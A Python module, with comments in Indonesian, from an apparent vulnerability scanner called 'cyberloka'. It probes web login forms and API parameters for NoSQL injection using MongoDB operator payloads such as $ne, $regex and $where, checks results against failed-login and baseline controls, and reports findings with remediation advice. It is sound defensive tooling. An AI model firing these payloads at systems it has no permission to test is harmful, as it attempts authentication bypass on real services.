"""NoSQL Injection probe (MongoDB/CouchDB style operators) — verification-first.

Masalah versi lama:
  - Login-bypass dianggap berhasil bila body memuat kata "welcome/dashboard/logout".
    Padahal halaman login mana pun bisa memuat kata-kata itu (mis. link "logout" di
    header) → false positive CRITICAL.
  - Error-based: kata "mongo/bson" di body → flag, tanpa cek apakah kata itu sudah
    ada di baseline.

Pendekatan baru:
  - Login-bypass: bandingkan respons operator dengan respons login GAGAL asli (kontrol
    kredensial salah). Hanya dianggap bypass bila respons operator BERBEDA nyata dari
    login gagal DAN memuat penanda sukses yang TIDAK ada di kontrol.
  - Error-based: error NoSQL harus ABSEN di baseline dan MUNCUL hanya setelah operator.
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core import probe
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

JSON_PAYLOADS = [
    {"$ne": None}, {"$gt": ""}, {"$regex": ".*"},
    {"$where": "1==1"}, {"$exists": True},
]
URL_PAYLOADS = [
    "[$ne]=null", "[$gt]=", "[$regex]=.*", "[$exists]=true",
]
SUCCESS_HINT = ("welcome", "dashboard", "logout", "berhasil", "selamat", "sign out")
ERROR_HINT = ("mongo", "bson", "$ne", "couchdb", "$where", "syntaxerror in javascript")


def _login_form(config: ScanConfig) -> dict | None:
    s = get_state(config)
    if not s:
        return None
    for f in s.forms:
        if any((i.get("type") or "").lower() == "password" for i in f["inputs"]):
            return f
    return None


def _api_urls(config: ScanConfig) -> list[str]:
    s = get_state(config)
    if not s:
        return []
    return [u for u in s.param_urls if "/api/" in u or "/v1/" in u or "/v2/" in u][:5]


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # 1. JSON operator injection on login form (dibandingkan dengan login gagal asli)
        form = _login_form(config)
        if form and form.get("action"):
            user_field = next((i["name"] for i in form["inputs"]
                               if (i.get("name") or "").lower() in ("username", "email", "user")), None)
            pass_field = next((i["name"] for i in form["inputs"]
                               if (i.get("type") or "").lower() == "password"), None)
            if user_field and pass_field:
                # Kontrol: login GAGAL dengan kredensial salah biasa (string).
                ctrl = client.post(form["action"],
                                   json={user_field: "cyberloka_nouser", pass_field: "cyberloka_wrongpw"})
                ctrl_text = (ctrl.text or "").lower() if ctrl is not None else ""
                ctrl_status = ctrl.status_code if ctrl is not None else None
                ctrl_success = any(h in ctrl_text for h in SUCCESS_HINT)
                for payload in JSON_PAYLOADS[:3]:
                    r = client.post(form["action"], json={user_field: payload, pass_field: payload})
                    if r is None:
                        continue
                    text = (r.text or "").lower()
                    has_success = any(h in text for h in SUCCESS_HINT)
                    # Bypass nyata: operator menghasilkan halaman BERBEDA dari login gagal,
                    # memuat penanda sukses yang TIDAK muncul di kontrol gagal.
                    differs = probe.similarity(text, ctrl_text) < 0.9 or r.status_code != ctrl_status
                    if r.status_code in (200, 302) and has_success and not ctrl_success and differs:
                        findings.append(Finding(
                            module="nosqli", target=form["action"],
                            title=f"Bypass login NoSQL TERVERIFIKASI: {payload}",
                            severity=Severity.CRITICAL,
                            confidence="confirmed",
                            description=("Operator MongoDB diterima sebagai kredensial dan menghasilkan "
                                         "sesi yang BERBEDA dari login gagal asli (penanda sukses muncul, "
                                         "tidak ada di kontrol). Login lolos tanpa password valid."),
                            evidence=(f"payload={payload} status={r.status_code} "
                                      f"(kontrol gagal status={ctrl_status}, sim<0.9)"),
                            cwe="CWE-943",
                            remediation="Validasi tipe input (string saja), pakai parameterized query, jangan pass body langsung ke find().",
                        ))
                        return findings

        # 2. URL operator injection — error harus dipicu operator (absen di baseline)
        for url in _api_urls(config):
            parsed = urlparse(url)
            params = list(parse_qsl(parsed.query))
            if not params:
                continue
            base = client.get(url)
            base_text = (base.text or "").lower() if base is not None else ""
            if any(e in base_text for e in ERROR_HINT):
                continue  # error sudah ada tanpa payload → tak bisa dipercaya
            k0, _ = params[0]
            for op in URL_PAYLOADS:
                new_q = urlencode(params[1:]) + (f"&{k0}{op}" if params[1:] else f"{k0}{op}")
                mutated = urlunparse(parsed._replace(query=new_q))
                r = client.get(mutated)
                if r is None:
                    continue
                t = (r.text or "").lower()
                if any(e in t for e in ERROR_HINT):
                    findings.append(Finding(
                        module="nosqli", target=mutated,
                        title=f"Error NoSQL TERVERIFIKASI pada parameter `{k0}`",
                        severity=Severity.HIGH,
                        confidence="confirmed",
                        description=("Error MongoDB/CouchDB MUNCUL hanya setelah parameter disuntik "
                                     "operator (absen di baseline) — backend memperlakukan input sebagai "
                                     "operator query."),
                        evidence=f"payload={op}; error absen di baseline, muncul setelah payload",
                        cwe="CWE-943",
                        remediation="Sanitize query param ke string, jangan auto-cast ke object.",
                    ))
                    return findings
    finally:
        client.close()
    return findings
